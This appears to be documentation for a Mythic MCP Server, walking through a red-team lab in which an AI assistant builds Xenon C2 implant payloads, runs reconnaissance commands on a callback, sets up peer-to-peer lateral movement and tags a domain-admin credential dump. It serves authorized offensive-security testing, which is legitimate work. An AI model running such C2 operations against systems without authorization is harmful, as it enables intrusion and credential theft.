# Lab Walkthrough

This walkthrough demonstrates a full red team engagement workflow driven
entirely through AI conversation, using the Mythic MCP Server.

!!! info "Environment"
    - Mythic C2 v3.4.23
    - Xenon agent (Windows)
    - Poseidon agent (Linux/macOS)
    - httpx and tcp C2 profiles
    - Mythic MCP Server connected via HTTP/SSE

---

## Phase 1 — Reconnaissance

### Enumerate the Environment

**Prompt:**
> *"What payload types and C2 profiles are available in Mythic?"*

**Tools called:**

```
mythic_get_payload_types → lists Xenon, Poseidon, Forge
mythic_get_c2_profiles   → lists httpx, http, tcp
```

The AI presents a table of agents with their supported OS targets and
available C2 profiles.

---

## Phase 2 — Payload Build

### Read Documentation First

**Prompt:**
> *"I need to build a Xenon payload over httpx. What configuration does
> httpx require?"*

**Tools called:**

```
mythic_get_documentation(path="C2 Profiles/httpx")
mythic_get_c2_profile_parameters(c2_profile_id=2)
mythic_get_payload_type_build_parameters(payload_type_id=2)
```

The AI reads the httpx docs, discovers that a `config.json` file is
required, and shows the build parameter schema.

### Build the Payload

**Prompt:**
> *"Build it with default httpx settings for a Windows x64 target."*

**Tools called:**

```
mythic_upload_file(filename="config.json", file_data=<base64>)
mythic_create_payload(
  payload_type="xenon",
  selected_os="Windows",
  c2_profiles=[{name: "httpx", parameters: {...}}],
  build_parameters={...}
)
mythic_wait_for_payload(payload_uuid="...")
mythic_download_payload(payload_uuid="...")
```

The AI returns a one-time download URL for the built payload.

---

## Phase 3 — Callback Management

### Wait for a Callback

**Prompt:**
> *"Are there any active callbacks?"*

```
mythic_get_active_callbacks → shows new callback from target host
```

### Execute Commands

**Prompt:**
> *"Run `whoami /all` and `ipconfig /all` on the callback."*

```
mythic_issue_task(callback_id=1, command="shell", params="whoami /all")
mythic_wait_for_task(task_id=1)
mythic_get_task_output(task_id=1)
mythic_issue_task(callback_id=1, command="shell", params="ipconfig /all")
mythic_wait_for_task(task_id=2)
mythic_get_task_output(task_id=2)
```

---

## Phase 4 — Lateral Movement (P2P)

### Deploy a TCP Agent

**Prompt:**
> *"Build a Xenon TCP payload for peer-to-peer linking."*

The AI builds a payload with the TCP C2 profile, uploads it to the first
callback, and sets up a P2P link.

```
mythic_create_payload(c2_profiles=[{name: "tcp", ...}])
mythic_add_callback_edge(source_id=1, destination_id=2, c2_profile_name="tcp")
```

---

## Phase 5 — Reporting

### MITRE Mapping

**Prompt:**
> *"What ATT&CK techniques have we exercised?"*

```
mythic_get_attacks_by_operation(operation_id=1)
```

### Tag Key Findings

**Prompt:**
> *"Tag the credential dump task with 'domain-admin-creds'."*

```
mythic_create_tag_type(name="domain-admin-creds", color="#ef4444")
mythic_create_tag(tag_type_id=1, source_type="task", source_id=3)
```

---

## Summary

Every step above was driven by **natural language**. The AI selected the right
tools, ordered them correctly, and presented results — no manual API calls, no
scripting. This is what the Mythic MCP Server enables.
